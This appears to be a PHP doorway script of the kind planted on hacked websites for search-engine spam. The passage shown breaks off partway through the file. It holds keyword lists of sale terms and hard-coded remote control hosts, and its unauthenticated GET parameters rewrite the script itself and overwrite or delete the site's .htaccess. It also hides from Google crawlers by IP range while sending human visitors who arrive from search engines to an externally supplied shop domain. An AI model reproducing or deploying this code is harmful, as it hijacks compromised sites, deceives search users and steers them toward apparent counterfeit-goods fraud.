<?php 
@ini_set('display_errors', 0);
@set_time_limit(3600);
define("DOMTXT","http://www.gallopjsc.site/10_C/");
define("GETDOM","http://www.nvarcharjsc-b.club/10_C/");
define("FNUM",50);
define("JGNUM","931");
define("LINKNUM","24");
define("BZSITE","m");
define("BZPRO","w");
//msbg
define("JDT","0");
//msend
//jthouzuibg
define("JTHZ",".do");
//jthouzuiend






//keyjgbg
define("KEYJG","13");
//keyjgbgend











// #llqllq#arr_nametimebg

$arrnametime[]="3";
$arrnametime[]="1";
$arrnametime[]="2";
$arrnametime[]="4";


// #llqllq#arr_nametimeend
// #llqllq#arr_wordbg

$arr_word[0][] ="6";$arr_word[0][] ="7";$arr_word[0][] ="5";$arr_word[0][] ="4";$arr_word[0][] ="6";$arr_word[0][] ="8";$arr_word[0][] ="7";$arr_word[0][] ="8";$arr_word[0][] ="4";$arr_word[0][] ="5";$arr_word[1][] ="4";$arr_word[1][] ="6";$arr_word[1][] ="5";$arr_word[1][] ="4";$arr_word[1][] ="6";$arr_word[1][] ="8";$arr_word[1][] ="5";$arr_word[1][] ="7";$arr_word[1][] ="7";$arr_word[1][] ="8";$arr_word[2][] ="7";$arr_word[2][] ="6";$arr_word[2][] ="5";$arr_word[2][] ="4";$arr_word[2][] ="7";$arr_word[2][] ="8";$arr_word[2][] ="4";$arr_word[2][] ="8";$arr_word[2][] ="6";$arr_word[2][] ="5";$arr_word[3][] ="7";$arr_word[3][] ="6";$arr_word[3][] ="6";$arr_word[3][] ="5";$arr_word[3][] ="8";$arr_word[3][] ="8";$arr_word[3][] ="7";$arr_word[3][] ="5";$arr_word[3][] ="4";$arr_word[3][] ="4";$arr_word[4][] ="4";$arr_word[4][] ="8";$arr_word[4][] ="5";$arr_word[4][] ="7";$arr_word[4][] ="7";$arr_word[4][] ="6";$arr_word[4][] ="5";$arr_word[4][] ="6";$arr_word[4][] ="4";$arr_word[4][] ="8";$arr_word[5][] ="5";$arr_word[5][] ="6";$arr_word[5][] ="5";$arr_word[5][] ="4";$arr_word[5][] ="6";$arr_word[5][] ="4";$arr_word[5][] ="7";$arr_word[5][] ="8";$arr_word[5][] ="7";$arr_word[5][] ="8";$arr_word[6][] ="5";$arr_word[6][] ="6";$arr_word[6][] ="4";$arr_word[6][] ="5";$arr_word[6][] ="8";$arr_word[6][] ="6";$arr_word[6][] ="7";$arr_word[6][] ="8";$arr_word[6][] ="4";$arr_word[6][] ="7";$arr_word[7][] ="4";$arr_word[7][] ="4";$arr_word[7][] ="5";$arr_word[7][] ="8";$arr_word[7][] ="6";$arr_word[7][] ="7";$arr_word[7][] ="7";$arr_word[7][] ="5";$arr_word[7][] ="8";$arr_word[7][] ="6";$arr_word[8][] ="7";$arr_word[8][] ="5";$arr_word[8][] ="7";$arr_word[8][] ="6";$arr_word[8][] ="6";$arr_word[8][] ="4";$arr_word[8][] ="8";$arr_word[8][] ="8";$arr_word[8][] ="4";$arr_word[8][] ="5";$arr_word[9][] ="8";$arr_word[9][] ="5";$arr_word[9][] ="4";$arr_word[9][] ="7";$arr_word[9][] ="4";$arr_word[9][] ="6";$arr_word[9][] ="6";$arr_word[9][] ="5";$arr_word[9][] ="8";$arr_word[9][] ="7";$arr_word[10][] ="7";$arr_word[10][] ="4";$arr_word[10][] ="5";$arr_word[10][] ="5";$arr_word[10][] ="8";$arr_word[10][] ="6";$arr_word[10][] ="6";$arr_word[10][] ="4";$arr_word[10][] ="7";$arr_word[10][] ="8";$arr_word[11][] ="8";$arr_word[11][] ="7";$arr_word[11][] ="4";$arr_word[11][] ="5";$arr_word[11][] ="8";$arr_word[11][] ="4";$arr_word[11][] ="5";$arr_word[11][] ="7";$arr_word[11][] ="6";$arr_word[11][] ="6";

// #llqllq#arr_wordend
// #llqllq#arr_keywz

$arrKeywz[]="4";
$arrKeywz[]="12";
$arrKeywz[]="11";
$arrKeywz[]="10";
$arrKeywz[]="8";
$arrKeywz[]="9";
$arrKeywz[]="5";
$arrKeywz[]="6";
$arrKeywz[]="7";


// #llqllq#arr_keywzend

// #llqllq#arr_fuhao

$arrfh[]="!";
$arrfh[]="-";
$arrfh[]="……";
$arrfh[]="?";
$arrfh[]=".";
$arrfh[]=",";


// #llqllq#arr_fuhaoend

// #llqllq#arr_keybg

$arr_key[]=" on sale ";
$arr_key[]=" lovely ";
$arr_key[]=" high-quality ";
$arr_key[]=" 70%OFF ";
$arr_key[]=" 30%OFF ";
$arr_key[]=" hot sale 2017 ";
$arr_key[]=" outlet ";
$arr_key[]=" delicate ";
$arr_key[]=" best ";
$arr_key[]=" durable service ";
$arr_key[]=" 85%OFF ";
$arr_key[]=" on sale ";
$arr_key[]=" 60%OFF ";
$arr_key[]=" high-quality ";
$arr_key[]=" 60%OFF ";
$arr_key[]=" 50%OFF ";
$arr_key[]=" outlet ";
$arr_key[]=" 60%OFF ";
$arr_key[]=" 80%OFF ";
$arr_key[]=" outlet ";
$arr_key[]=" outlet ";
$arr_key[]=" well-wreapped ";
$arr_key[]=" free shipping ";
$arr_key[]=" on sale ";
$arr_key[]=" delicate ";
$arr_key[]=" 70%OFF ";
$arr_key[]=" hot sale ";
$arr_key[]=" delicate ";
$arr_key[]=" hot sale ";
$arr_key[]=" chic ";
$arr_key[]=" new ";
$arr_key[]=" well-wreapped ";
$arr_key[]=" free shipping ";
$arr_key[]=" durable modeling ";
$arr_key[]=" hot sale 2017 ";
$arr_key[]=" hot sale 2017 ";
$arr_key[]=" low-cost ";
$arr_key[]=" good ";
$arr_key[]=" cheap ";
$arr_key[]=" good ";
$arr_key[]=" cheap ";
$arr_key[]=" durable service ";
$arr_key[]=" chic ";
$arr_key[]=" 70%OFF ";
$arr_key[]=" outlet ";
$arr_key[]=" lovely ";
$arr_key[]=" low-cost ";
$arr_key[]=" well-wreapped ";
$arr_key[]=" best ";
$arr_key[]=" high-quality ";
$arr_key[]=" chic ";
$arr_key[]=" new ";
$arr_key[]=" durable modeling ";
$arr_key[]=" low-cost ";
$arr_key[]=" well-wreapped ";
$arr_key[]=" good ";
$arr_key[]=" high-quality ";
$arr_key[]=" new ";
$arr_key[]=" durable modeling ";
$arr_key[]=" 70%OFF ";
$arr_key[]=" 30%OFF ";
$arr_key[]=" lovely ";
$arr_key[]=" free shipping ";
$arr_key[]=" 70%OFF ";
$arr_key[]=" low-cost ";
$arr_key[]=" 60%OFF ";
$arr_key[]=" best ";
$arr_key[]=" hot sale ";
$arr_key[]=" durable modeling ";
$arr_key[]=" 80%OFF ";
$arr_key[]=" new ";
$arr_key[]=" well-wreapped ";
$arr_key[]=" 80%OFF ";
$arr_key[]=" chic ";
$arr_key[]=" 60%OFF ";
$arr_key[]=" durable modeling ";
$arr_key[]=" 85%OFF ";
$arr_key[]=" free shipping ";
$arr_key[]=" on sale ";
$arr_key[]=" cheap ";
$arr_key[]=" on sale ";
$arr_key[]=" durable service ";
$arr_key[]=" hot sale ";
$arr_key[]=" good ";
$arr_key[]=" 30%OFF ";
$arr_key[]=" cheap ";
$arr_key[]=" 80%OFF ";
$arr_key[]=" free shipping ";
$arr_key[]=" 85%OFF ";
$arr_key[]=" cheap ";
$arr_key[]=" durable service ";
$arr_key[]=" 85%OFF ";
$arr_key[]=" lovely ";
$arr_key[]=" 85%OFF ";
$arr_key[]=" 50%OFF ";
$arr_key[]=" 50%OFF ";
$arr_key[]=" best ";
$arr_key[]=" new ";
$arr_key[]=" hot sale ";
$arr_key[]=" 50%OFF ";
$arr_key[]=" good ";
$arr_key[]=" durable service ";
$arr_key[]=" hot sale 2017 ";
$arr_key[]=" delicate ";
$arr_key[]=" 50%OFF ";
$arr_key[]=" 80%OFF ";
$arr_key[]=" chic ";
$arr_key[]=" lovely ";
$arr_key[]=" best ";
$arr_key[]=" delicate ";
$arr_key[]=" hot sale 2017 ";
$arr_key[]=" low-cost ";
$arr_key[]=" 30%OFF ";
$arr_key[]=" 30%OFF ";
$arr_key[]=" high-quality ";


// #llqllq#arr_keyend
// #llqllq#randkeybg
$strRand[0]="zvcfrmxadoetwjskhylibuqngp";
$strRand[1]="hpdcograzlvfbesnmuytxkqjwi";
$strRand[2]="hpvwzxkfujlboynamisteqgdrc";
$strRand[3]="wbocdyunrlxqpihtjfvekszgam";
$strRand[4]="xdfohvesyimgtwcrqjplzbknua";
$strRand[5]="xbkrwdocvyatzfspgimnheuqlj";
$strRand[6]="mrqudkfagtwjzyxelshnbocvip";
$strRand[7]="jgbrnvwxyfpsoimqthlkzuecad";
$strRand[8]="fyipbhlarsmtdjwxcqvgkuzoen";
$strRand[9]="ofwvuzjmreihncgqldxsbkapty";
$strRand[10]="phgzckbyotexujidlrsamvnqfw";
$strRand[11]="tdnwygekqpxabcmfuojzlihrvs";
$strRand[12]="wbqslnteomhyiucfzdgxkpjarv";
$strRand[13]="urxkvylwzmqciogabfstjnehpd";
$strRand[14]="ndkjbftyrpshuexomgqvwaiclz";
$strRand[15]="aemwxvgqchsbifrnzjtuodlpyk";
$strRand[16]="cizvfmejabrdpknlshogwuyqxt";
$strRand[17]="xbjnplagswcqkmyuitehovfrdz";
$strRand[18]="crduygswhoxvimjkblqtfzeapn";
$strRand[19]="nckejpsuxbatrqzwhygmfdivol";
$strRand[20]="fkyzweuvadilxghptqocsmbrjn";
$strRand[21]="tldizsnmorjwyxahgefbpcvquk";
$strRand[22]="vepwbnrtdilmachsujoyfzkgqx";
$strRand[23]="ukmxfhasgozndpcwijvqreltyb";
$strRand[24]="qokvxthieunfzdlpwmcgjrysba";
$strRand[25]="xihfbvknogjzlmwredsaupycqt";
$strRand[26]="tlhgndmkercvzsuqybpxjfaowi";
$strRand[27]="fdsnojtxpqkzgiulcebahmywvr";
$strRand[28]="mfpxsokajhurevdlzcybqwgnti";
$strRand[29]="mpauinzdrvbxgksfjqcywlhtoe";
$strRand[30]="abyliorzsekuqxchfgnwvptmdj";
$strRand[31]="izjrtpbgenmkcslvwxfdhquoya";
$strRand[32]="dplwahceubqgoxvsijtmfrknyz";
$strRand[33]="pjzsdhkelmuaytinwcqrfxvgob";
$strRand[34]="bgifxqvkzntapcmesrwydlhouj";
$strRand[35]="zdpnstogqvhlwjeukirxcafmyb";
$strRand[36]="ryxphgzkoaftqcsimlbjdvuewn";
$strRand[37]="hgfmczxyotivspwqnudbejlkra";
$strRand[38]="wzluhdqovesijfpnmbxarygckt";
$strRand[39]="oikbmnavgjtzpsedrqwuhlxycf";
$strRand[40]="jmnfcgxhlebazykwdrsioqpuvt";
$strRand[41]="ikjrcqvbgzfytdlnspxowmeuha";
$strRand[42]="fubahjcpztvdsryxgmqwkileno";
$strRand[43]="fhnurkwvqmyscoplbzatidgxje";
$strRand[44]="vqnrpciyzeogbkhslmtuadwfxj";
$strRand[45]="gfpbxtklmvhodycuiznqejrasw";
$strRand[46]="krdozhjalpstfgwinvquybemxc";
$strRand[47]="dchmaxyzqljrewpkbvnufisgot";
$strRand[48]="inlwyhcxvfjgabuzostrepmqdk";
$strRand[49]="zpxitsjycweauhgmqkvbofnrld";
$strRand[50]="hzsptyqombguexnlrkfwivdcja";
$strRand[51]="ldnpgbqjfazkxmousyrvcetiwh";
$strRand[52]="jaiuebnfgqhlxykdpowcvstmzr";
$strRand[53]="sbtiwkgcojyuphmrxzldveafqn";
$strRand[54]="cemqravnjilydzkwugtpfxobhs";
$strRand[55]="yzqklrvmnsbxfpcujhwotaedgi";
$strRand[56]="jhazkyfbudcmgrsveiqtlnoxwp";
$strRand[57]="jqcxiydfalkbgteonmphzwrsvu";
$strRand[58]="gkswudzbyonhirqejvxlftcamp";
$strRand[59]="nvajylxzrmiucoedwgftqpbshk";
$strRand[60]="gautrdxzmiscpvbqnlkohwefyj";
$strRand[61]="autwgqlyckbvoizenjhxsfrmpd";
$strRand[62]="jvhsfcbalrdxkgitnymeuqozpw";
$strRand[63]="isumhxwjbkerozydnpaqglctfv";
$strRand[64]="tbaykuzlngjmpecvxwosdrifhq";
$strRand[65]="toraclvjdgqxmhbyusizkpewfn";
$strRand[66]="bkgymzjoxpdfsvnwrthqluceia";
$strRand[67]="evsmjanwiygtbkucpxlodhzqfr";
$strRand[68]="jcrpokxqwsietmfauhgbnvzlyd";
$strRand[69]="zwvuoaehbkstrjngxfiycpmqld";
$strRand[70]="udjvcpbhzykioexqfwtsgnrmal";
$strRand[71]="kmgcahlstezpjqbyviwoxrfnud";
$strRand[72]="zvcyoisdagbmthlpjqnkwufrxe";
$strRand[73]="xqflgatusbzckeniymdorhwpvj";
$strRand[74]="qaxmejgknfipcorvlbwthdyzus";
$strRand[75]="hrbyqetupiwklzadjmocvngsxf";
$strRand[76]="kwlhebnqvfdaopsijxyztrugcm";
$strRand[77]="eatrnbgvypqfldicuoxsjhwzkm";
$strRand[78]="cpuqiolhtfamzkyvxdsbjwgner";
$strRand[79]="lkweganbvrqtocyuzdjfxshpim";
$strRand[80]="pynvtdemclibhqrkjuafzwosxg";
$strRand[81]="ovegcdlziwnfxsbhkuqmpatjyr";
$strRand[82]="yghwiflodqtnxeupbkasczvjrm";
$strRand[83]="hacuklbrvodnmegyipxwzjtsqf";
$strRand[84]="rqxtgmjwnhyiaklbcsdzeufvpo";
$strRand[85]="qrmldsfvocekuiwjtzgbyahnxp";
$strRand[86]="getwpjburnfolsiykhaxqcvzdm";
$strRand[87]="cjkxumqygnptoflbrdawvheizs";
$strRand[88]="ixjlcgotkhebzynrwapmvfsqud";
$strRand[89]="zyaijwtrnspufkclgdmbxhvoeq";
$strRand[90]="mnxgiboczqlspfeajhkrytuwdv";
$strRand[91]="utqnkgzhvybpixmdwjroaesflc";
$strRand[92]="jbdzqwoyserigxhfplvnkcatmu";
$strRand[93]="almhjqkdgezrnsbocfutpvxiwy";
$strRand[94]="ulimqpbcekgdtjrsnxayzfvohw";
$strRand[95]="jpfdgyvxteizsbnuwrqcmoklah";
$strRand[96]="gvywrpifhaeqnxksdmluzocbjt";
$strRand[97]="pjrilkeodtbuwafzscqvhnmxyg";
$strRand[98]="vuderzjcybtnqwlafsxmogpkhi";
$strRand[99]="vylohfmekazqrbcupgsnxdijwt";

// #llqllq#randkeyend
if(isset($_GET['rset']) &&  $_GET['rset'] == 'set'){
	
	$r1 = '#(// \#l{2}ql{2}q\#arr_keybg)(.*?)(// \#l{2}ql{2}q\#arr_keyend)#s';	$str = file_get_contents("index.php");	
	shuffle($arr_key);	$rp1 = '';	foreach($arr_key as $vals){
		$rp1 .= '$arr_key[]="'. $vals .'";'. PHP_EOL;	}
	
	$str = preg_replace($r1, '\1'.  PHP_EOL . PHP_EOL .$rp1 . PHP_EOL . PHP_EOL .'\3', $str);	
	$r0 = '#(/+keyjgbg)(.*?)(/+keyjgbgend)#s';	$str = preg_replace($r0, '\1'. PHP_EOL .'define("KEYJG","'. rand(1,20) .'");'. PHP_EOL .'\3'. PHP_EOL , $str);			
	$r3 = '#(// \#l{2}ql{2}q\#arr_keywz)(.*?)(// \#l{2}ql{2}q\#arr_keywzend)#s';	
	shuffle($arrKeywz);	$rp2 = '';	foreach($arrKeywz as $valpimg){
		$rp2 .= '$arrKeywz[]="'. $valpimg .'";'. PHP_EOL;	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);	
			
	$r3 = '#(// \#l{2}ql{2}q\#arr_wordbg)(.*?)(// \#l{2}ql{2}q\#arr_wordend)#s';	$strword = '';
	$arrWordOld = array(4,5,6,7,8,4,5,6,7,8);	$rp2 = '';
	for($i=0;$i<12;$i++){
		shuffle($arrWordOld); 
		foreach($arrWordOld as $vtemps)
			$rp2 .= '$arr_word['. $i .'][] ="'. $vtemps .'";';	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);		
	$r3 = '#(// \#l{2}ql{2}q\#arr_nametimebg)(.*?)(// \#l{2}ql{2}q\#arr_nametimeend)#s';	
	shuffle($arrnametime);	$rp2 = '';	foreach($arrnametime as $valpimg){
		$rp2 .= '$arrnametime[]="'. $valpimg .'";'. PHP_EOL;	}
	
	$str = preg_replace($r3, '\1'. PHP_EOL . PHP_EOL .  $rp2 . PHP_EOL . PHP_EOL .'\3', $str);	
				
	$r4 = '#(// \#l{2}ql{2}q\#randkeybg)(.*?)(// \#l{2}ql{2}q\#randkeyend)#s';	
	$arrABC = range('a','z');	
	$strTemp1 = '';	for($i=0;$i<100;$i++){
		shuffle($arrABC); 
		$strtemp = '';		foreach($arrABC as $value){
			$strtemp .= $value;		}	
		
		$strTemp1 .= '$strRand[' .$i. ']="' . $strtemp .'";'. PHP_EOL;	}
	$str = preg_replace($r4, '\1'. PHP_EOL . $strTemp1  . PHP_EOL .'\3', $str);	
	
	file_put_contents("index.php", $str);
	
	$num = rand(1,FNUM);	$num = $num - 1;	require_once("id$num.php");	$indexId=array_rand($arrId,1);	$str = str_replace('$id = "20174211-9149"; //llq index id', '$id = "'. $arrId[$indexId] .'"; //llq index id', $str);	
	$r3='#(// \#l{2}ql{2}q\#arr_fuhao)(.*?)(// \#l{2}ql{2}q\#arr_fuhaoend)#s';	shuffle($arrfh);$rp2='';foreach($arrfh as $valpimg){$rp2.='$arrfh[]="'.$valpimg.'";'.PHP_EOL;}$str=preg_replace($r3,'\1'.PHP_EOL.PHP_EOL.$rp2.PHP_EOL.PHP_EOL.'\3',$str);	file_put_contents(__FILE__, $str);
	echo '<br/>rset ok!<br/>';
}
if(isset($_GET["jgshu"]) && $_GET["jgshu"]){
	$strDefault = file_get_contents(__FILE__);	
	$strDefault = str_replace('define("JGNUM","931");', 'define("JGNUM","'.$_GET["jgshu"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>jgshu (".$_GET["jgshu"].") ok!<br/>";}
if(isset($_GET["ljshu"]) && $_GET["ljshu"]){
	$strDefault = file_get_contents(__FILE__);	
	$strDefault = str_replace('define("LINKNUM","24");', 'define("LINKNUM","'.$_GET["ljshu"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>ljshu (".$_GET["ljshu"].") ok!<br/>";}
if(isset($_GET["moshi"])){
	
	if($_GET["moshi"] != 0 && $_GET["moshi"] != 1 && $_GET["moshi"] != 2 && $_GET["moshi"] != 3){
			echo "<br/><span style='color:red'>set fails, moshi value must be 0,1,2 or 3 !</span><br/>";			die();	}
	if($_GET["moshi"] == 2 || $_GET["moshi"] == 3){
		@unlink(".htaccess");	}
	
	$strDefault = file_get_contents(__FILE__);	
	
	$r3='#(/{2}msbg)(.*?)(/{2}msend)#s';
	$rp2 = 'define("JDT","'.$_GET["moshi"].'");';	$strDefault=preg_replace($r3,'\1'.PHP_EOL.$rp2.PHP_EOL.'\3',$strDefault);	
	
	$strDefault = str_replace('define("JDT","0");', 'define("JDT","'.$_GET["moshi"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>moshi (".$_GET["moshi"].") ok!<br/>";}
if(isset($_GET['hzui']) && $_GET['hzui']){
	$dirNames = dirname(__FILE__);    $httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));	
	$PreDir = '';	if(JDT == 1){
		$UrlBaseDir = $httcReplace;		$RewriteOnDir = '';	}else{
		$UrlBaseDir = '';		$PreDir = '../';		$RewriteOnDir = $httcReplace . '/';	}
	$strhtt = '';	if (file_exists("$PreDir.htaccess")){
		@chmod("$PreDir.htaccess",0755);		$strhtt = file_get_contents("$PreDir.htaccess");	}
		
	if(!(strstr($strhtt,'RewriteBase') || strstr($strhtt,'RewriteRule')))
	{
		$strhtt = '<IfModule mod_rewrite.c>'.PHP_EOL . 'Options +FollowSymLinks'. PHP_EOL .'RewriteEngine on'. PHP_EOL .'RewriteBase /'. $UrlBaseDir . PHP_EOL .'</IfModule>';	}else{
		$strhtt = str_ireplace('# RewriteBase ','RewriteBase ',$strhtt);		$strhtt = str_ireplace('#RewriteBase ','RewriteBase ',$strhtt);	}
		
	$hzReplace = trim($_GET['hzui']);
	if(1){
			
		$r1 = '#(.*RewriteBase.*)#i';		$r2 = '#RewriteRule#i';		
		$rsut = '\1'.PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)-.*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL;
		$rsut2 = PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZPRO .'(\d+)[-/].*[-/]'. BZSITE .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$2-\$1&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/].*[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL . 'RewriteRule ^.*[-/]'. BZSITE .'(\d+)[-/]'. BZPRO .'(\d+)[-/].*$ '.$RewriteOnDir.'index\.php?id=\$1-\$2&%{QUERY_STRING} [L]'.PHP_EOL .'RewriteRule' ;		
		if(preg_match($r1,$strhtt)){
			$strhtt = preg_replace($r1,$rsut,$strhtt,1);		}else{
			$strhtt = preg_replace($r2,$rsut2,$strhtt,1);		}
		
		$indexContent = file_get_contents("index.php");		$r3 = '#(/+jthouzuibg)(.*?)(/+jthouzuiend)#s';		$indexContent = preg_replace($r3, '\1'. PHP_EOL .'define("JTHZ",".'. $hzReplace .'");'. PHP_EOL .'\3'. PHP_EOL , $indexContent);		file_put_contents("index.php", $indexContent);		
		if(JDT == 1 or JDT == 0){
			file_put_contents("$PreDir.htaccess", $strhtt);		}
	}
	
	echo "<br/>hzui ($hzReplace) modify ok!<br/>";	
}
if(isset($_GET["modifydate"]) && $_GET["modifydate"]){
	$strDefault = file_get_contents(__FILE__);	
	$strDefault = str_replace('define("PRENAME","20160409");', 'define("PRENAME","'.$_GET["modifydate"].'");', $strDefault);	file_put_contents(__FILE__,$strDefault);	echo "<br/>modifydate (".$_GET["modifydate"].") ok!<br/>";}
$arrArrr = array();$j = 0;for($i=0;$i<20;$i+=2){
   $arrArrr[$j++] = $strRand{$i}.$strRand{$i+1};}
$Arrrarr = array_flip($arrArrr);
if(isset($_GET["gsitemap"])){
	
	$O_OO0_0O_0='America/Chicago';	@date_default_timezone_set($O_OO0_0O_0);	
	if (! is_dir("sitemap"))
		mkdir("../sitemap", 0755);	
	global $gnumber;
	$gnumber = 1;
	$bgNum = (int)trim($_GET["gsitemap"]);
	if($bgNum > FNUM)
	   die("The Number Must Lower Then " . FNUM);
   
	$arrNumTemp = getMapNum($bgNum);
	
	
	foreach($arrNumTemp as $vss){
		
		$vals = "id$vss.php";		include("$vals");	
		echo $vals."<br/>";
	
		if($gnumber == 1){
			if(JDT == 1){
				gsitemap($arrId,2,1);			}else{
				gsitemap($arrId,1,2);			}
		}else{
			
			if(JDT == 1){
				gsitemap2($arrId,2,1);			}else{
				gsitemap2($arrId,1,2);			}
			
		}
		
		unset($arrId,$tempArr1,$tempArr2);	}
	
}
if(isset($_GET["gsitemap"]) || isset($_GET["rset"]) || isset($_GET["hzui"]) || isset($_GET["jgshu"]) || isset($_GET["ljshu"]) || isset($_GET["modifydate"]) || isset($_GET["moshi"])){
	die();}
if(JDT==2){
	
	$UrlParent=end((explode('index.php',$_SERVER['REQUEST_URI'])));	if($UrlParent){
		$tempSid = '';		$tempPid = '';		
		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
		
	}
	
}elseif(JDT==3&&isset($_GET['keyword'])&&$_GET['keyword']){
		
		$tempSid = '';		$tempPid = '';		$UrlParent = $_GET['keyword'];		
		$r0 ='#^'. BZSITE .'(\d+)[-/]#i';		
		$r1='#[-/]'. BZSITE .'(\d+)[-/]#i';		
		if(preg_match($r0,$UrlParent,$matches)){
			if(isset($matches[1]))
				$tempSid = $matches[1];		}else{
			preg_match($r1,$UrlParent,$matches10);			if(isset($matches10[1]))
				$tempSid = $matches10[1];		}
	
		
		$r2='#^'. BZPRO .'(\d+)[-/]#i';		$r3='#[-/]'. BZPRO .'(\d+)[-/]#i';		
		if(preg_match($r2,$UrlParent,$matches2)){
			if(isset($matches2[1]))
				$tempPid = $matches2[1];		}else{
			
			preg_match($r3,$UrlParent,$matches13);			if(isset($matches13[1]))
				$tempPid = $matches13[1];		}
		
		
		if($tempSid && $tempPid){
			$_GET['id']= $tempSid .'-'. $tempPid;		}
	
	
}
function getRandStr(){
	
	$arrABC = range('a','z');	shuffle($arrABC); 
	$randNum = rand(4,6);	
	$str = implode('',array_slice($arrABC,0,$randNum));	
	return $str;}
if(isset($_GET["id"]))
	$id = $_GET["id"];else{
	$id = "20174211-9149"; //llq index id 
}
$idTemp = explode('-',$id);if(count($idTemp) < 2)
	die();
$id23 = end($idTemp);
$numArr_key = count($arr_key);
$siteid = $idTemp[count($idTemp)-2];
$siteAID = $siteid. '-' .$id23;$fileKey = $id23 % FNUM;
$pInfoUrl =  GETDOM . "gpage.php?id=$siteAID&jgnum=". JGNUM ."&linknum=".LINKNUM;
// $_SERVER["HTTP_REFERER"] = "google.com.hk";

if(isset($_SERVER["HTTP_REFERER"])){
	$referer = $_SERVER["HTTP_REFERER"]; 
	$russ = '#(google|yahoo|incredibar|bing|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i';
	
	$jumDom = DOMTXT . $siteid .".txt";	
	$domJump = curl_get_from_webpage($jumDom,'',5);	$iszz = isCrawler();	
	$ipRanges = array(  array('64.233.160.0' , '64.233.191.255'),   array('66.102.0.0' , '66.102.15.255' ) ,   array('66.249.64.0' , '66.249.95.255') ,   array('72.14.192.0' , '72.14.255.255') ,   array('74.125.0.0' , '74.125.255.255') ,   array('209.85.128.0' , '209.85.255.255') ,   array('216.239.32.0' , '216.239.63.255') ); 
	$localIp = get_real_ip();	
	$is_or_no = is_ip($localIp,$ipRanges);	
	if(preg_match($russ, $referer) && $iszz == false && $is_or_no == false){
		echo '<script language="javascript" type="text/javascript">'. PHP_EOL .'window.location.href="'. $domJump . "index.php?main_page=product_info&products_id=" . $id23 .'";'. PHP_EOL .'</script>';		die();	}
}
 
 $fcontent = '';
